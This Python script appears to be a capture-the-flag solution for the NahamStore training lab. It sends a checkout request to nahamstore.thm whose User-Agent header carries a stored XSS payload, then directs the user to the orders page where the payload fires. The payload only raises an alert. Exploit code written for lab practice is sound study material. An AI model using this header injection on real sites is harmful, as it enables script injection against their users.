import requests

cookies = {
    'session': '6f3dc2a98eb8b9af433dd145de0d96e6',
    'token': '3a98a689369d84600122eed5b5ac6b78',
}

headers = {
    'User-Agent': '<script>alert("XSS")</script>',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://nahamstore.thm/basket',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://nahamstore.thm',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

data = {
  'address_id': '5',
  'card_no': '1234123412341234'
}

response = requests.post('http://nahamstore.thm/basket', headers=headers, cookies=cookies, data=data)
print("[+] Goto http://nahamstore.thm/account/orders And Open The Top Order")
